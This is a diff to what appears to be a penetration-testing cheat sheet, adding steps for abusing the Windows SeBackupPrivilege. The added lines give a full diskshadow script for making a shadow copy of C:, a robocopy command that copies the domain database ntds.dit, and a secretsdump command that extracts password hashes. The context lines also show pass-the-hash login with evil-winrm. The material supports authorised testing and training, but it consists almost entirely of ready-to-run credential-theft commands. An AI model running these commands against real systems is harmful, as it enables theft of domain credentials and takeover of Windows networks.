@@ -172,6 +172,30 @@ impacket-secretsdump -sam sam -system system
 
 evil-winrm -i <ip> -u <user> -H <hash>
 ```
+---
+```bash
+# cat backup
+set verbose on
+set metadata C:\Windows\Temp\meta.cab
+set context clientaccessible
+set context persistent
+begin backup
+add volume C: alias cdrive
+create
+expose %cdrive% E:
+end backup
+
+unix2dos backup 
+```
+```powershell
+diskshadow /s backup
+ls E:
+robocopy /b E:\Windows\ntds . ntds.dit
+```
+```bash
+secretsdump.py -ntds ntds.dit -system system LOCAL
+```
+
 - https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege
 ---
 # PowerUp.ps1
